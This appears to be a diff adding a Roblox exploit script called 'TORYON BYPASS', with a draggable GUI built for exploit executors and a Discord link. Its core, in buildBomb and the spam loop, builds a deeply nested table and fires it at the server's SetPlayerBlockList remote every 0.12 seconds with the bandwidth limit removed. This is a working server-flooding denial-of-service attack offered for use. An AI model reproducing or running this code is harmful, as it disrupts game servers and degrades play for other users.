@@ -1,0 +1,515 @@
+local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
+local TweenService = game:GetService("TweenService")
+local NetworkClient = game:GetService("NetworkClient")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
+
+-- ═══════════════ IDS DES 3 IMAGES ═══════════════
+local BACKGROUND_IMAGES = {
+	"rbxassetid://118430925194305",
+	"rbxassetid://72861082408515",
+	"rbxassetid://111960353660490",
+}
+
+-- ═══════════════ CONFIG ═══════════════
+local DEFAULT_POWER = 97000  -- PUISSANCE FIXÉE À 97000 PARTOUT
+local DEFAULT_KEY = Enum.KeyCode.F
+local SIZE_MIN, SIZE_MAX = 0.7, 1.5
+local TRACK_W, KNOB_S = 230, 14
+local RADIUS = 13
+
+local C = {
+	panel   = Color3.fromRGB(16, 16, 16),
+	border  = Color3.fromRGB(40, 40, 40),
+	outline = Color3.fromRGB(70, 70, 70),
+	graybg  = Color3.fromRGB(45, 45, 45),
+	white   = Color3.fromRGB(255, 255, 255),
+	red     = Color3.fromRGB(255, 0, 0),
+	black   = Color3.fromRGB(0, 0, 0),
+	gray    = Color3.fromRGB(150, 150, 150),
+	dim     = Color3.fromRGB(115, 115, 115),
+}
+
+-- ═══════════ LOGIQUE BYPASS (Blue Duels Style) ═══════════
+local DEPTH = 296
+local spamThread = nil
+local bomb = nil
+local running = false
+local SPAM_DELAY = 0.12  -- v2 spam delay
+
+local function buildBomb(power)
+    local maintable = {}
+    local spammedtable = {}
+    table.insert(spammedtable, {})
+    local z = spammedtable[1]
+    for i = 1, DEPTH do
+        local tableins = {}
+        table.insert(z, tableins)
+        z = tableins
+    end
+    local maxRep = math.floor(power / (DEPTH + 2))
+    for i = 1, maxRep do
+        table.insert(maintable, spammedtable)
+    end
+    return maintable
+end
+
+local function restartSpamLoop(power)
+	if spamThread then pcall(task.cancel, spamThread) end
+	bomb = buildBomb(power)
+	spamThread = task.spawn(function()
+		while running do
+			if bomb then
+				pcall(function()
+					game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
+				end)
+			end
+			task.wait(SPAM_DELAY)
+		end
+	end)
+end
+
+local function onBypassToggle(state, power)
+	running = state
+	pcall(function()
+		NetworkClient:SetOutgoingKBPSLimit(state and math.huge or 0)
+	end)
+	if state then
+		restartSpamLoop(power)
+	else
+		if spamThread then pcall(task.cancel, spamThread) end
+		spamThread = nil
+		bomb = nil
+	end
+end
+
+local function stopSpamLoop()
+	running = false
+	if spamThread then pcall(task.cancel, spamThread) end
+	spamThread = nil
+	bomb = nil
+end
+
+-- ═══════════════ HELPERS ═══════════════
+local function new(class, props, parent)
+	local obj = Instance.new(class)
+	for k, v in pairs(props or {}) do obj[k] = v end
+	obj.Parent = parent
+	return obj
+end
+local function corner(obj, r)
+	return new("UICorner", {CornerRadius = UDim.new(0, r)}, obj)
+end
+local function stroke(obj, color, thickness)
+	return new("UIStroke", {Color = color, Thickness = thickness or 1, ApplyStrokeMode = Enum.ApplyStrokeMode.Border}, obj)
+end
+local function normalizeId(id)
+	if type(id) == "number" then return "rbxassetid://" .. id end
+	if string.find(id, "rbxassetid://") then return id end
+	return "rbxassetid://" .. id
+end
+local function getGuiParent()
+	if typeof(gethui) == "function" then
+		local ok, res = pcall(gethui)
+		if ok and res then return res end
+	end
+	local ok, coreGui = pcall(function() return game:GetService("CoreGui") end)
+	if ok and coreGui then return coreGui end
+	return LocalPlayer:WaitForChild("PlayerGui")
+end
+
+local parent = getGuiParent()
+local oldGui = parent:FindFirstChild("ToryonBypassGui")
+if oldGui then oldGui:Destroy() end
+
+local gui = new("ScreenGui", {
+	Name = "ToryonBypassGui",
+	ResetOnSpawn = false,
+	IgnoreGuiInset = true,
+	ZIndexBehavior = Enum.ZIndexBehavior.Sibling,
+}, nil)
+if type(syn) == "table" and type(syn.protect_gui) == "function" then
+	pcall(syn.protect_gui, gui)
+elseif typeof(protectgui) == "function" then
+	pcall(protectgui, gui)
+end
+pcall(function() gui.Parent = parent end)
+if not gui.Parent then gui.Parent = LocalPlayer:WaitForChild("PlayerGui") end
+
+-- ═══════════════ FRAME PRINCIPALE ═══════════════
+local main = new("Frame", {
+	Name = "MainFrame",
+	Size = UDim2.fromOffset(250, 404),
+	Position = UDim2.new(0.5, -125, 0.5, -202),
+	BackgroundTransparency = 1,
+	BorderSizePixel = 0,
+	ClipsDescendants = true,
+	Active = true,
+}, gui)
+corner(main, RADIUS)
+stroke(main, Color3.fromRGB(38, 38, 38), 1.2)
+local uiScale = new("UIScale", {Scale = 1}, main)
+
+-- ── FOND AVEC IMAGE ──
+local mainBg = new("ImageLabel", {
+	Size = UDim2.new(1, 0, 1, 0),
+	BackgroundTransparency = 1,
+	Image = normalizeId(BACKGROUND_IMAGES[3]),
+	ScaleType = Enum.ScaleType.Crop,
+	ImageTransparency = 0,
+	ZIndex = 0,
+}, main)
+corner(mainBg, RADIUS)
+
+-- ── HEADER ──
+local logo = new("Frame", {
+	Size = UDim2.fromOffset(38, 38), Position = UDim2.fromOffset(6, 4),
+	BackgroundColor3 = C.red, BorderSizePixel = 0, ZIndex = 2,
+}, main)
+corner(logo, 19)
+new("TextLabel", {
+	Size = UDim2.new(1, 0, 1, 0), BackgroundTransparency = 1,
+	Text = "T", TextColor3 = C.black, Font = Enum.Font.GothamBlack, TextSize = 24,
+	TextXAlignment = Enum.TextXAlignment.Center, TextYAlignment = Enum.TextYAlignment.Center,
+}, logo)
+new("TextLabel", {
+	Size = UDim2.fromOffset(150, 15), Position = UDim2.fromOffset(50, 8),
+	BackgroundTransparency = 1, Text = "TORYON BYPASS", TextColor3 = C.red,
+	Font = Enum.Font.GothamBold, TextSize = 13, TextXAlignment = Enum.TextXAlignment.Left,
+}, main)
+new("TextLabel", {
+	Size = UDim2.fromOffset(150, 13), Position = UDim2.fromOffset(50, 24),
+	BackgroundTransparency = 1, Text = "discord.gg/karMRBX9Q", TextColor3 = C.red,
+	Font = Enum.Font.GothamMedium, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
+}, main)
+local minButton = new("TextButton", {
+	Size = UDim2.fromOffset(18, 16), Position = UDim2.fromOffset(198, 12),
+	BackgroundTransparency = 1, AutoButtonColor = false, Text = "-",
+	TextColor3 = C.gray, Font = Enum.Font.GothamBold, TextSize = 15,
+}, main)
+local closeButton = new("TextButton", {
+	Size = UDim2.fromOffset(18, 16), Position = UDim2.fromOffset(222, 12),
+	BackgroundTransparency = 1, AutoButtonColor = false, Text = "×",
+	TextColor3 = C.gray, Font = Enum.Font.GothamBold, TextSize = 13,
+}, main)
+local header = new("Frame", {
+	Size = UDim2.new(1, 0, 0, 44), BackgroundTransparency = 1, ZIndex = 1,
+}, main)
+
+-- ── TABS PC / MOBILE ──
+local tabsFrame = new("Frame", {
+	Size = UDim2.fromOffset(234, 30), Position = UDim2.fromOffset(8, 48),
+	BackgroundColor3 = C.panel, BorderSizePixel = 0,
+}, main)
+corner(tabsFrame, 15)
+stroke(tabsFrame, C.border, 1)
+local pcButton = new("TextButton", {
+	Size = UDim2.fromOffset(115, 26), Position = UDim2.fromOffset(2, 2),
+	AutoButtonColor = false, Text = "PC", Font = Enum.Font.GothamBold, TextSize = 11,
+	BackgroundColor3 = C.white, TextColor3 = C.red, BorderSizePixel = 0,
+}, tabsFrame)
+corner(pcButton, 13)
+local mobileButton = new("TextButton", {
+	Size = UDim2.fromOffset(115, 26), Position = UDim2.fromOffset(117, 2),
+	AutoButtonColor = false, Text = "MOBILE", Font = Enum.Font.GothamBold, TextSize = 11,
+	BackgroundTransparency = 1, TextColor3 = C.gray, BorderSizePixel = 0,
+}, tabsFrame)
+corner(mobileButton, 13)
+
+-- ── STATUS + POWER ──
+local statusLabel = new("TextLabel", {
+	Size = UDim2.fromOffset(230, 12), Position = UDim2.fromOffset(10, 87),
+	BackgroundTransparency = 1, Text = "BYPASS DISABLED", TextColor3 = C.dim,
+	Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
+}, main)
+local powerDisplay = new("TextButton", {
+	Size = UDim2.fromOffset(234, 62), Position = UDim2.fromOffset(8, 102),
+	BackgroundColor3 = C.graybg, AutoButtonColor = false, BorderSizePixel = 0,
+	Text = "97K", TextColor3 = C.red, Font = Enum.Font.GothamBlack, TextSize = 32,
+}, main)
+corner(powerDisplay, 12)
+stroke(powerDisplay, C.outline, 1.5)
+
+-- Le power display est juste pour l'affichage, pas d'édition possible
+powerDisplay.AutoButtonColor = false
+
+new("TextLabel", {
+	Size = UDim2.fromOffset(250, 12), Position = UDim2.fromOffset(0, 169),
+	BackgroundTransparency = 1, Text = "POWER FIXED · 97000", TextColor3 = C.dim,
+	Font = Enum.Font.GothamMedium, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Center,
+}, main)
+
+-- ── BACKGROUNDS ──
+new("TextLabel", {
+	Size = UDim2.fromOffset(140, 12), Position = UDim2.fromOffset(10, 187),
+	BackgroundTransparency = 1, Text = "BACKGROUNDS", TextColor3 = C.gray,
+	Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
+}, main)
+local bgButtons, bgStrokes = {}, {}
+for i = 1, 3 do
+	local x = 8 + (i - 1) * 81
+	local b = new("TextButton", {
+		Size = UDim2.fromOffset(72, 54), Position = UDim2.fromOffset(x, 202),
+		BackgroundTransparency = 1, AutoButtonColor = false, BorderSizePixel = 0,
+		Text = "", ClipsDescendants = true,
+	}, main)
+	corner(b, 10)
+	local img = new("ImageLabel", {
+		Size = UDim2.new(1, 0, 1, 0),
+		BackgroundTransparency = 1,
+		Image = normalizeId(BACKGROUND_IMAGES[i]),
+		ScaleType = Enum.ScaleType.Crop,
+	}, b)
+	corner(img, 10)
+	bgStrokes[i] = stroke(b, C.border, 1)
+	bgButtons[i] = b
+end
+
+-- ── SIZE ──
+new("TextLabel", {
+	Size = UDim2.fromOffset(60, 12), Position = UDim2.fromOffset(10, 265),
+	BackgroundTransparency = 1, Text = "SIZE", TextColor3 = C.gray,
+	Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
+}, main)
+local sizeValue = new("TextLabel", {
+	Size = UDim2.fromOffset(92, 12), Position = UDim2.fromOffset(150, 265),
+	BackgroundTransparency = 1, Text = "1.0", TextColor3 = C.red,
+	Font = Enum.Font.GothamBold, TextSize = 10, TextXAlignment = Enum.TextXAlignment.Right,
+}, main)
+local sliderTrack = new("Frame", {
+	Size = UDim2.fromOffset(TRACK_W, 4), Position = UDim2.fromOffset(10, 283),
+	BackgroundColor3 = C.border, BorderSizePixel = 0,
+}, main)
+corner(sliderTrack, 2)
+local sliderFill = new("Frame", {
+	Size = UDim2.fromOffset(4, 4), BackgroundColor3 = C.white, BorderSizePixel = 0,
+}, sliderTrack)
+corner(sliderFill, 2)
+local sliderKnob = new("Frame", {
+	Size = UDim2.fromOffset(KNOB_S, KNOB_S), BackgroundColor3 = C.white, BorderSizePixel = 0,
+}, sliderTrack)
+corner(sliderKnob, 7)
+
+-- ── KEYBIND (sera masqué en mode mobile) ──
+local keybindLabel = new("TextLabel", {
+	Size = UDim2.fromOffset(140, 12), Position = UDim2.fromOffset(10, 299),
+	BackgroundTransparency = 1, Text = "KEYBIND", TextColor3 = C.gray,
+	Font = Enum.Font.GothamBold, TextSize = 9, TextXAlignment = Enum.TextXAlignment.Left,
+}, main)
+local keybindButton = new("TextButton", {
+	Size = UDim2.fromOffset(234, 34), Position = UDim2.fromOffset(8, 314),
+	BackgroundColor3 = C.panel, AutoButtonColor = false, BorderSizePixel = 0,
+	Text = DEFAULT_KEY.Name, TextColor3 = C.red, Font = Enum.Font.GothamBold, TextSize = 12,
+}, main)
+corner(keybindButton, 10)
+stroke(keybindButton, C.border, 1)
+
+-- ── ACTIVATE ──
+local activateButton = new("TextButton", {
+	Size = UDim2.fromOffset(234, 38), Position = UDim2.fromOffset(8, 356),
+	BackgroundColor3 = C.white, AutoButtonColor = false, BorderSizePixel = 0,
+	Text = "ACTIVATE BYPASS", TextColor3 = C.black, Font = Enum.Font.GothamBold, TextSize = 13,
+}, main)
+corner(activateButton, 19)
+local activateStroke = stroke(activateButton, C.white, 1.2)
+activateStroke.Transparency = 1
+
+-- ── BOUTON RÉOUVRIR ──
+local reopenButton = new("TextButton", {
+	Size = UDim2.fromOffset(36, 36), Position = UDim2.new(1, -46, 1, -46),
+	BackgroundColor3 = C.red, AutoButtonColor = false, BorderSizePixel = 0,
+	Text = "T", TextColor3 = C.black, Font = Enum.Font.GothamBlack, TextSize = 22,
+	Visible = false,
+}, gui)
+corner(reopenButton, 18)
+
+-- ═══════════════ ÉTAT ═══════════════
+local active = false
+local FIXED_POWER = 97000  -- PUISSANCE FIXÉE PARTOUT
+local currentScale = 1.0
+local boundKey = DEFAULT_KEY
+local waitingForKey = false
+local minimized = false
+local dragging, sliding = false, false
+local dragStart, dragStartPos = nil, nil
+local mobileMode = false
+
+-- ═══════════════ SIZE SLIDER ═══════════════
+local function layoutSlider()
+	local ratio = (currentScale - SIZE_MIN) / (SIZE_MAX - SIZE_MIN)
+	local x = ratio * (TRACK_W - KNOB_S)
+	sliderKnob.Position = UDim2.fromOffset(x, -5)
+	sliderFill.Size = UDim2.fromOffset(math.max(4, x + KNOB_S / 2), 4)
+end
+local function setScaleFromX(px)
+	local absX = sliderTrack.AbsolutePosition.X
+	local w = sliderTrack.AbsoluteSize.X
+	if w <= 0 then return end
+	local ratio = math.clamp((px - absX) / w, 0, 1)
+	currentScale = SIZE_MIN + ratio * (SIZE_MAX - SIZE_MIN)
+	uiScale.Scale = currentScale
+	sizeValue.Text = string.format("%.1f", currentScale)
+	layoutSlider()
+end
+layoutSlider()
+
+sliderTrack.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		sliding = true
+		setScaleFromX(input.Position.X)
+	end
+end)
+
+-- ═══════════════ ACTIVATION ═══════════════
+local function setActive(state)
+	active = state
+	statusLabel.Text = state and "BYPASS ENABLED" or "BYPASS DISABLED"
+	statusLabel.TextColor3 = state and C.red or C.dim
+	activateButton.Text = state and "DEACTIVATE BYPASS" or "ACTIVATE BYPASS"
+	activateButton.BackgroundColor3 = state and C.panel or C.white
+	activateButton.TextColor3 = state and C.red or C.black
+	activateStroke.Transparency = state and 0 or 1
+	onBypassToggle(state, FIXED_POWER)  -- TOUJOURS 97000
+end
+activateButton.Activated:Connect(function() setActive(not active) end)
+
+-- ═══════════════ TABS (PC/Mobile) avec keybind masqué en mobile ═══════════════
+local function selectTab(pc)
+	mobileMode = not pc
+	pcButton.BackgroundTransparency = pc and 0 or 1
+	pcButton.TextColor3 = pc and C.black or C.gray
+	mobileButton.BackgroundTransparency = pc and 1 or 0
+	mobileButton.TextColor3 = pc and C.gray or C.black
+
+	if mobileMode then
+		-- Masquer complètement le keybind (bouton et label)
+		keybindButton.Visible = false
+		keybindLabel.Visible = false
+		-- Désactiver la logique
+		keybindButton.Active = false
+	else
+		-- Réafficher
+		keybindButton.Visible = true
+		keybindLabel.Visible = true
+		keybindButton.Text = boundKey.Name
+		keybindButton.TextColor3 = C.red
+		keybindButton.BackgroundColor3 = C.panel
+		keybindButton.Active = true
+		keybindLabel.TextColor3 = C.gray
+	end
+end
+pcButton.Activated:Connect(function() selectTab(true) end)
+mobileButton.Activated:Connect(function() selectTab(false) end)
+selectTab(true)
+
+-- ═══════════════ BACKGROUNDS ═══════════════
+local function selectBg(i)
+	for j = 1, 3 do
+		if j == i then
+			bgStrokes[j].Color = C.white
+			bgStrokes[j].Thickness = 2
+		else
+			bgStrokes[j].Color = C.border
+			bgStrokes[j].Thickness = 1
+		end
+	end
+	mainBg.Image = normalizeId(BACKGROUND_IMAGES[i])
+end
+for i = 1, 3 do
+	bgButtons[i].Activated:Connect(function() selectBg(i) end)
+end
+selectBg(3)
+
+-- ═══════════════ KEYBIND ═══════════════
+keybindButton.Activated:Connect(function()
+	if mobileMode then return end
+	waitingForKey = true
+	keybindButton.Text = "..."
+end)
+
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+	if waitingForKey and input.UserInputType == Enum.UserInputType.Keyboard then
+		if mobileMode then
+			waitingForKey = false
+			keybindButton.Text = boundKey.Name
+			return
+		end
+		boundKey = input.KeyCode
+		keybindButton.Text = input.KeyCode.Name
+		waitingForKey = false
+		return
+	end
+	if waitingForKey then return end
+
+	if not mobileMode and not gameProcessed and input.UserInputType == Enum.UserInputType.Keyboard then
+		if input.KeyCode == boundKey then
+			setActive(not active)
+		end
+	end
+end)
+
+-- ═══════════════ MINIMIZE / CLOSE ═══════════════
+minButton.Activated:Connect(function()
+	minimized = not minimized
+	minButton.Text = minimized and "+" or "-"
+	TweenService:Create(main, TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
+		Size = minimized and UDim2.fromOffset(250, 46) or UDim2.fromOffset(250, 404),
+	}):Play()
+end)
+closeButton.Activated:Connect(function()
+	main.Visible = false
+	reopenButton.Visible = true
+end)
+reopenButton.Activated:Connect(function()
+	main.Visible = true
+	reopenButton.Visible = false
+end)
+
+-- ═══════════════ DRAG ═══════════════
+local function over(obj, p)
+	local b = obj.AbsolutePosition
+	local s = obj.AbsoluteSize
+	return p.X >= b.X and p.X <= b.X + s.X and p.Y >= b.Y and p.Y <= b.Y + s.Y
+end
+header.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		if over(minButton, input.Position) or over(closeButton, input.Position) then return end
+		dragging = true
+		dragStart = input.Position
+		dragStartPos = main.Position
+	end
+end)
+UserInputService.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		if sliding then setScaleFromX(input.Position.X) end
+		if dragging and dragStart then
+			local delta = (input.Position - dragStart) / currentScale
+			main.Position = UDim2.new(
+				dragStartPos.X.Scale, dragStartPos.X.Offset + delta.X,
+				dragStartPos.Y.Scale, dragStartPos.Y.Offset + delta.Y
+			)
+		end
+	end
+end)
+UserInputService.InputEnded:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+		dragging = false
+		dragStart = nil
+		sliding = false
+	end
+end)
+
+-- Initialisation de l'affichage
+powerDisplay.Text = "97K"
+
+-- On désactive au démarrage
+setActive(false)
+
+-- Nettoyage à la fermeture du jeu
+game:BindToClose(function()
+	if active then
+		stopSpamLoop()
+		NetworkClient:SetOutgoingKBPSLimit(0)
+	end
+end)
